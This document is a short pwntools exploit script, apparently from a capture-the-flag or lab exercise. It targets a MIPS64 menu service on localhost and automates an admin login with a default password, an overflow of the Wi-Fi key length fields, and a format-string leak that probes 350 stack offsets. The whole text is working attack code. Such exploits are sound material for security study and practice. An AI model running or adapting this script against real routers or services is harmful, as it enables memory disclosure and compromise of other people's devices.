from pwn import * # CONNECT:

context.update(arch='mips64', os='linux', word_size=64, endian='little')

for i in range(350):
    target = remote("localhost", "4000")

    # Select admin menu
    target.recvuntil(b"#>")
    buf = b'5'
    target.sendline(buf)

    # Enter pwd
    target.recvuntil(b"#>")
    buf = b'admin'
    target.sendline(buf)

    # Select Change Wifi Key
    target.recvuntil(b"#>")
    buf = b'2'
    target.sendline(buf)

    # Enter pwd and overflow the len fields
    target.recvuntil(b"#>")
    buf = b'1' * 24
    target.sendline(buf)

    # Quit adm menu
    target.recvuntil(b"#>")
    buf = b'1'
    target.sendline(buf)

    target.recvuntil(b"#>")
    buf = b'3'
    target.sendline(buf)
    target.recvuntil(b"#>")

    payload = f'%{i}$p'.encode()
    target.sendline(payload)
    for j in range (4):
        target.recvline()

    res = target.recvline()
    print(f"{i}: {res}")
    target.close()